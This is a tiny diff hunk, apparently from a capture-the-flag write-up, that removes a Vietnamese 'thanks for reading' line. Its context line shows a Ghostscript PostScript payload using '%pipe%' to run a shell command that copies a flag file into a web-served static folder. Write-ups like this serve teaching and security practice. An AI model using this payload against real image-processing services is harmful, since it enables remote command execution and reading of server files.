@@ -73,5 +73,3 @@ mark /OutputFile (%pipe%cat flag > application/static/petpets/test.txt) currentd
 ```
 
 ![image](https://user-images.githubusercontent.com/61985236/132112752-4583ab37-3e83-4e77-9d83-bfde6b024c67.png)
-
-Cám ơn bạn đã đọc ♡.
